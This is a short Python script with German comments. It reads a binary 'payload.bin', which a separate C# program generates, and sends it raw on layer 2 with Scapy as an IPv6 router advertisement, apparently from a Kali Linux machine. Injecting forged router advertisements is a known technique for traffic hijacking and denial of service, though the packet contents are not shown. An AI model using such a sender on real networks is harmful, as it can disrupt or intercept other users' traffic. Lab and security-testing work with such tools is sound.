from scapy.all import sendp

# 1. Lies die von deinem C#-Programm generierte Datei ein
with open("payload.bin", "rb") as f:
    raw_bytes = f.read()

# 2. Sende die rohen Bytes auf Layer 2 
# WICHTIG: Ersetze "eth0" durch den Namen deiner Netzwerkschnittstelle auf Kali!
print("Sende generiertes IPv6 RA Paket...")
sendp(raw_bytes, iface="eth0", verbose=True)